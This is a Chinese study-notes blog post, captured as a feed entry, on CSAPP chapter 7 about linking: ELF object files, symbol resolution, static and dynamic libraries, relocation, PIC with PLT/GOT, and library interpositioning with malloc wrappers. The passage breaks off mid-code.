      <link href="/2024/01/30/csapp/%E7%AC%AC7%E7%AB%A0%E2%80%94%E2%80%94%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/01/30/csapp/%E7%AC%AC7%E7%AB%A0%E2%80%94%E2%80%94%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>链接 (linking) 是将各种代码和数据片段收集并组合成为一个单一文件的过程，这个文件可被加载（复制）到内存并执行 。<br/></p><ul><li><p>链接可以执行于编译时 (compile time), 也就是在源代码被翻译成机器代码时；</p></li><li><p>也可以执行与加载时 (load time), 也就是在程序被加载器 (loader) 加载到内存并执行时；</p></li><li><p>甚至执行于运行时 (run time), 也就是由应用程序来执行。</p></li></ul><h3 id="编译器驱动程序"><a href="#编译器驱动程序" class="headerlink" title="编译器驱动程序"></a>编译器驱动程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* main.c */</span></span><br><span class="line"><span class="comment">/* $begin main */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val = sum(<span class="built_in">array</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end main */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* sum.c */</span></span><br><span class="line"><span class="comment">/* $begin sum */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        s += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end sum */</span></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240131173001880.png" alt="image-20240131173001880"></p><ol><li><code>c预处理器(cpp)</code>将 的源程序 main.c译成一个 ASCII 码的中间文件 main.i</li><li><code>编译器 (cc1)</code>, 它将 main.i 翻译成一个 <code>ASCII 汇编语言文件</code>main.s</li><li><code>汇编器 (as)</code>, 它将 main.s 翻译成一个<code>可重定位目标文件</code>(relo-eatable object file) main. o:</li><li>运行<code>链接器程序 ld</code>, 将main.o,sum.o 以及一些必要的系统目标文件组合起来，创建一个可执行目标文件 (executable object file)prog</li><li>shell 调用操作系统中一个叫做<code>加载器 (loader)</code>的函数，它将 可执行文件 prog 中的代码和数据复制到内存，然后将控制转移到这个程序的开头。</li></ol><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>为了构造可执行文件，链接器必须完成两个主要任务：</p><ul><li><code>符号解析 (symbol resolution)</code> 。目标文件定义和引用符号，每个符号对应于一个函数、一个全局变量或一个静态变量（即 中任何以 static 属性 声明的变量）。符号解析的目的是将每个符号引用正好和一个符号定义关联起来。</li><li><code>重定位 (relocation)</code> 。编译器和汇编器生成从地址0开始的代码和数据节。链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，使得它们指向这个内存位置 链接器使用汇编器产生的重定位条目(relocation entry) 的详细指令，不加甄别地执行这样的重定位。</li></ul><h3 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h3><ul><li><code>可重定位目标文件</code>。包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行目标文件</li><li><code>可执行目标文件</code>。包含二进制代码和数据，其形式可以被直接复制到内存并执行</li><li><code>共享目标文件</code>。一种特殊类型的可重定位目标文件，可以在加载或者运行时被动态地加载进内存并链接。</li><li>编译器和汇编器生成可重定位目标文件（包括共享目标文件）。链接器生成可执行目标文件。</li></ul><div class="table-container"><table><thead><tr><th>系统</th><th>格式</th></tr></thead><tbody><tr><td>第一个Unix系统</td><td>a.out</td></tr><tr><td>Windows</td><td>可移植可执行格式(Portable Executable，PE)</td></tr><tr><td>MacOS-X</td><td>Mach-O</td></tr><tr><td>x86-64 Linux Unix</td><td>可执行可链接格式(Executable and Linkable Format, ELF)</td></tr></tbody></table></div><h3 id="可重定位目标文件"><a href="#可重定位目标文件" class="headerlink" title="可重定位目标文件"></a>可重定位目标文件</h3><div class="table-container"><table><thead><tr><th>节</th><th></th></tr></thead><tbody><tr><td>.text</td><td>已编译程序的机器代码。</td></tr><tr><td>.rodata</td><td>只读数据段</td></tr><tr><td>.data</td><td>已初始化的全局和静态变量。</td></tr><tr><td>.bss</td><td>未初始化全局变量和静态变量</td></tr><tr><td>.symtab</td><td>符号表，它存放在程序中定义和引用的函数和全局变量的信息</td></tr><tr><td>.debug</td><td>一个调试符号表，其条目是程序中定义的局部变量和类型定义，程序中定义和引用的全局变量，以及原始的 源文件。只有以 -g 选项调用编译器驱动程序时，才会得到这张表。</td></tr><tr><td></td></tr></tbody></table></div><h3 id="符号和符号表"><a href="#符号和符号表" class="headerlink" title="符号和符号表"></a>符号和符号表</h3><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:center">全局符号</td><td>模块定义并能被其他模块引用的全局符号</td><td>非静态的C函数和全局变量</td></tr><tr><td style="text-align:center">外部符号</td><td>其他模块定义并被模块引用的全局符号</td><td>其他模块定义的非静态的C函数和全局变量</td></tr><tr><td style="text-align:center">局部符号</td><td>只被模块定义和引用的局部符号</td><td>带 static 属性的C函数和全局变量。</td></tr></tbody></table></div><ul><li>局部C变量运行时存储在栈中</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* $begin elfsymbol */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>   name;      <span class="comment">/* String table offset */</span></span><br><span class="line">    <span class="type">char</span>  type:<span class="number">4</span>,    <span class="comment">/* Function or data (4 bits) */</span></span><br><span class="line">          binding:<span class="number">4</span>; <span class="comment">/* Local or global (4 bits) */</span></span><br><span class="line">    <span class="type">char</span>  reserved;  <span class="comment">/* Unused */</span></span><br><span class="line">    <span class="type">short</span> section;   <span class="comment">/* Section header index */</span></span><br><span class="line">    <span class="type">long</span>  value;     <span class="comment">/* Section offset or absolute address */</span></span><br><span class="line">    <span class="type">long</span>  size;      <span class="comment">/* Object size in bytes */</span></span><br><span class="line">&#125; Elf64_Symbol;</span><br><span class="line"><span class="comment">/* $end elfsymbol */</span></span><br></pre></td></tr></table></figure><p>通过<code>readelf -s</code> 可以查看目标文件符号表</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201100904804.png" alt="image-20240201100904804"></p><h3 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h3><ul><li>链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。</li><li>当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个<code>链接器符号表条目</code>，并把它交给链接器处理。</li></ul><h4 id="链接器如何解析多重定义的全局符号"><a href="#链接器如何解析多重定义的全局符号" class="headerlink" title="链接器如何解析多重定义的全局符号"></a>链接器如何解析多重定义的全局符号</h4><ul><li><p>函数和已初始化的全局变量是强符号</p></li><li><p>未初始化的全局变量是弱符号。</p></li></ul><p>根据强弱符号的定义， Linux 链接器使用下面的规则来处理多重定义的符号名：</p><ul><li>规则1：不允许有多个同名的强符号。</li><li>规则 2: 如果有一个强符号和多个弱符号同名，那么选择强符号。</li><li>规则 3: 如果有多个弱符号同名，那么从这些弱符号中任意选择一个。</li></ul><h4 id="与静态库链接"><a href="#与静态库链接" class="headerlink" title="与静态库链接"></a>与静态库链接</h4><p>链接器只复制被程序引用的目标模块</p><p><code>AR工具</code>可用于生成静态链接库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[] ~/Desktop/csapp/code/link gcc -c addvec.c multvec.c</span><br><span class="line">[] ~/Desktop/csapp/code/link ar rcs libvector.a addvec.o multvec.o</span><br><span class="line">[] ~/Desktop/csapp/code/link gcc -c main2.c</span><br><span class="line">[] ~/Desktop/csapp/code/link gcc -static -o prog2c main2.o ./libvector.a</span><br><span class="line">[] ~/Desktop/csapp/code/link ./prog2c</span><br><span class="line">z = [4 6]</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201105530744.png" alt="image-20240201105530744"></p><h4 id="链接器如何使用静态库来解析引用"><a href="#链接器如何使用静态库来解析引用" class="headerlink" title="链接器如何使用静态库来解析引用"></a>链接器如何使用静态库来解析引用</h4><ul><li>在符号解析阶段，链接器从左到右按照它们在编译器驱动程序命令行上出现的顺序来扫描可重定位目标文件和存档文件。</li><li>如果静态库之间有依赖关系，我们要将调用函数的静态库放在定义函数静态库之前</li></ul><h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>合并输入模块，并为每个符号分配运行时地址。</p><p>重定位由两部分组成：</p><ul><li>重定位节和符号定义。在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。然后，链接器将运行时内存地址赋给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个符号。</li><li>重定位节中的符号引用。在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。依赖于重定位条目(relocation entry)。</li></ul><h4 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h4><p>代码的重定位条目放在 .rel.text巳初始化数据的重定位条目放在 .rel.data 中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* $begin elfrelo */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> offset;    <span class="comment">/* Offset of the reference to relocate */</span></span><br><span class="line">    <span class="type">long</span> type:<span class="number">32</span>,   <span class="comment">/* Relocation type */</span></span><br><span class="line">         symbol:<span class="number">32</span>; <span class="comment">/* Symbol table index */</span></span><br><span class="line">    <span class="type">long</span> addend;    <span class="comment">/* Constant part of relocation expression */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* $end elfrelo */</span></span><br></pre></td></tr></table></figure></p><p>重定位类型：</p><ul><li>R_X86_64_PC32 。重定位一个使用 32 位PC相对地址的引用。</li><li>R_X86_64_32 。重定位一个使用 32 位绝对地址的引用。</li><li>…</li></ul><h4 id="重定位符号引用"><a href="#重定位符号引用" class="headerlink" title="重定位符号引用"></a>重定位符号引用</h4><p>重定位算法的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">foreach sections &#123; </span><br><span class="line">foreach relocation entry r &#123; </span><br><span class="line">refptr = s + r.offset; I* ptr to reference to be relocated *I </span><br><span class="line">I* Relocate a PC-relative reference *I </span><br><span class="line"><span class="keyword">if</span> Cr.type== R_X86_64_PC32) &#123; </span><br><span class="line">refaddr = ADDR(s) + r.offset; I* ref<span class="number">&#x27;</span>s run-time address *I </span><br><span class="line">*refptr = (<span class="type">unsigned</span>) (ADDR(r.symbol) + r.addend - refaddr); </span><br><span class="line">&#125; </span><br><span class="line">I* Relocate an absolute reference *I </span><br><span class="line"><span class="title function_">if</span> <span class="params">(r.type == R_X86_64_32)</span> </span><br><span class="line">*refptr = (<span class="type">unsigned</span>) (ADDR(r.symbol) + r.addend); &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[] ~/Desktop/csapp/code/link objdump -dx main.o</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201113131489.png" alt="image-20240201113131489"></p><p>可能是gcc版本的问题，重定位类型不一致。都使用了相对寻址。最后也无法成功编译prog。</p><h3 id="可执行目标文件"><a href="#可执行目标文件" class="headerlink" title="可执行目标文件"></a>可执行目标文件</h3><p>可执行文件是完全链接的（可重定位的）</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201115116040.png" alt="image-20240201115116040"></p><ul><li>ELF 可执行文件被设计得很容 加载到内存，可执行文件的连 的片 (chunk) 被映射到连续的内存段 程序头部表 (program h eader table) 描述了这种映射关系。</li><li>所谓内核就是操作系统驻留在内存的部分。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201115520305.png" alt="image-20240201115520305"></p><p>off: 目标文件中的偏移；     vaddr /paddr : 存地址 对齐要求；     filesz: 目标文件中的大小    memsz: 内存中的段大小     flags: 运行时访问权限。</p><h3 id="加载可执行目标文件"><a href="#加载可执行目标文件" class="headerlink" title="加载可执行目标文件"></a>加载可执行目标文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">/linux&gt; </span><span class="language-bash">./prog</span> </span><br></pre></td></tr></table></figure><blockquote><p>Linux 系统中的每个程序都运行在一个进程上下文中，有自己的虚拟地址空间。当 shell 运行一个程序时，父 shell 进程生成一个子进程，它是父进程的一个复制。子进程通过 execve统调用启动加载器。加载器删除子进程现有的虚拟内存段，并创建一组新的代码、数据、堆和栈段。新的栈和堆段被初始化为零 通过将虚拟地址空间中的页映射到可执行文件的页大小的片 (chunk), 新的代码和数据段袚初始化为可执行文件的内容。最后，加载器跳转到 _start地址，它最终会调用应用程序的 main 函数。除了一些头部信息，在加载过程中没有任何从磁盘到内存的数据复制 。直到 CPU 引用一个被映射的虚拟页时才会进行复制，此时，操作系统利用它的页面调度机制自动将页面从磁盘传送到内存。</p></blockquote><h3 id="动态链接共享库"><a href="#动态链接共享库" class="headerlink" title="动态链接共享库"></a>动态链接共享库</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201134337320.png" alt="image-20240201134337320"></p><p>共享库也称为共享目标 (shared object), Linux 系统中通常用 .so 后缀来表示。微软的操作系统大最地使用了共享库，它们称为 DLL(动态链接库）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux &gt; cd lib64</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201135409499.png" alt="image-20240201135409499"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows &gt; C:\Windows\System32</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201135344297.png" alt="image-20240201135344297"></p><p>生成动态链接库及动态链接的可执行程序</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201142210125.png" alt="image-20240201142210125"></p><p>-fpic 选项指示编译器生成与位置无关的代码。<br>-shared选项指示链接器创建一个共享的目标文件。</p><p>动态链接器本身就是一个共享目标（如在 Linux 系统上的 ld - linux. so), 加载器不会像它通常所做地那样将控制传递给应用，而是加载和运行这个动态链接器。</p><p>我们可以在节中查看到动态链接所需要的动态链接库</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201142848795.png" alt="image-20240201142848795"></p><h3 id="从应用程序中加载和链接共享库"><a href="#从应用程序中加载和链接共享库" class="headerlink" title="从应用程序中加载和链接共享库"></a>从应用程序中加载和链接共享库</h3><p>动态链接是强大有用的技术。</p><ul><li>分发软件。</li><li>构建高性能 Web 服务器。</li></ul><p>Linux 系统为动态链接器提供了一个简单的接口，允许应用程序在运行时加载和链接共享库。分别为dlopen 、dlsym 和 dlclose 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line"><span class="type">int</span> y[<span class="number">2</span>] = &#123;<span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="type">int</span> z[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *handle;</span><br><span class="line">    <span class="type">void</span> (*addvec)(<span class="type">int</span> *, <span class="type">int</span> *, <span class="type">int</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">char</span> *error;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dynamically load the shared library that contains addvec() */</span></span><br><span class="line">    handle = dlopen(<span class="string">&quot;./libvector.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get a pointer to the addvec() function we just loaded */</span></span><br><span class="line">    addvec = dlsym(handle, <span class="string">&quot;addvec&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, error);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now we can call addvec() just like any other function */</span></span><br><span class="line">    addvec(x, y, z, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;z = [%d %d]\n&quot;</span>, z[<span class="number">0</span>], z[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Unload the shared library */</span></span><br><span class="line">    <span class="keyword">if</span> (dlclose(handle) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end dll */</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -rdynamic -o prog2r dll.c -ldl</span><br></pre></td></tr></table></figure><p>调用函数后可以看到成功在运行中调用libvector.so库</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201144409139.png" alt="image-20240201144409139"></p><blockquote><p>Java 定义了一个标准调用规则，叫做<code>Java 本地接口 (Java Native Interface, JNI)</code> , 它允许Java 程序调用”本地的 “C 或C++ 函数。 JNI 的基本思想是将本地函数（如 foo) 编译到一个共享库中（如 foo.so) 当一个正在运行的 Java 程序试图调用函数 foo 时， Java解释器利用 <code>dlopen 接口</code>（或者与其类似的接口）<code>动态链接和加载</code> foo.so, 然后再调用 foo</p></blockquote><h3 id="位置无关代码"><a href="#位置无关代码" class="headerlink" title="位置无关代码"></a>位置无关代码</h3><p>可以加载而无需重定位的代码称为位置无关代码 (Position Independent Code, PIC)。用户对 GCC 使用 -fpic 选项指示 GNU 编译系统生成 PIC 代码。 共享库的编译必须总使用该选项。</p><h4 id="PIC数据引用"><a href="#PIC数据引用" class="headerlink" title="PIC数据引用"></a>PIC数据引用</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201145720373.png" alt="image-20240201145720373"></p><p>编译器可以利用代码段和数据段之间不变的距离，直接 <code>PC 相对引用</code>，并增加一个重定位，让链接器在构造这个共享模块时解析它。</p><h4 id="PIC函数调用"><a href="#PIC函数调用" class="headerlink" title="PIC函数调用"></a>PIC函数调用</h4><ul><li><code>过程链接表 (PLT)</code>PLT 是一个数组，其中每个条目是 16 字节代码。 PLT[O] 是一个特殊条目，它跳转到动态链接器中。每个被可执行程序调用的库函数都有它自己PLT 条目。每个条目都负责调用一个具体的函数。 </li><li><code>全局偏移量表 (GOT)</code>。正如我们看到的， GOT 是一个数组，其中每个条目是8 字节地址。和 PLT 联合使用时,GOT [0]和 GOT[l] 包含动态链接器在解析函数地址时会使用的信息。 GOT[2] 是动态链接器在 ld-linux.so 模块中的入口点。</li></ul><h4 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h4><p>假设我们用调用<code>addvec</code>函数，首先进入PLT[2]。若为第<code>1</code>次调用，由于采用延迟绑定，我们需要进行动态链接，然后把控制传递给addvec。第<code>n（n&gt;1)</code>调用由于<code>addvec</code>函数已经被加载到内存中确定的位置，则会从直接从PLT表跳转到GOT表中，在GOT表中进行函数调用。<br/></p><ul><li><p><code>plt</code>在代码段，<code>got</code>在数据段</p></li><li><p><code>plt</code>是地址的填写者，<code>got</code>是地址的保存者</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201145741391.png" alt="image-20240201145741391"></p><h3 id="库打桩机制"><a href="#库打桩机制" class="headerlink" title="库打桩机制"></a>库打桩机制</h3><p>Linux 链接器支持一个很强大的技术，称为库打桩 (library interpositioning), 它允许你截获对共享库函数的调用，取而代之执行自己的代码。</p><h3 id="编译时打桩"><a href="#编译时打桩" class="headerlink" title="编译时打桩"></a>编译时打桩</h3><p>int.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> malloc(size) mymalloc(size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> free(ptr) myfree(ptr)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mymalloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">myfree</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br></pre></td></tr></table></figure><p>mymalloc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RUNTIME</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* malloc wrapper function */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *(*mallocp)(<span class="type">size_t</span> size);</span><br><span class="line">    <span class="type">char</span> *error;</span><br><span class="line"></span><br><span class="line">    mallocp = dlsym(RTLD_NEXT, <span class="string">&quot;malloc&quot;</span>); <span class="comment">/* Get address of libc malloc */</span></span><br><span class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(error, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *ptr = mallocp(size); <span class="comment">/* Call libc malloc */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(%d) = %p\n&quot;</span>, (<span class="type">int</span>)size, ptr);</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free wrapper function */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*freep)(<span class="type">void</span> *) = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> *error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ptr)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    freep = dlsym(RTLD_NEXT, <span class="string">&quot;free&quot;</span>); <span class="comment">/* Get address of libc free */</span></span><br><span class="line">    <span 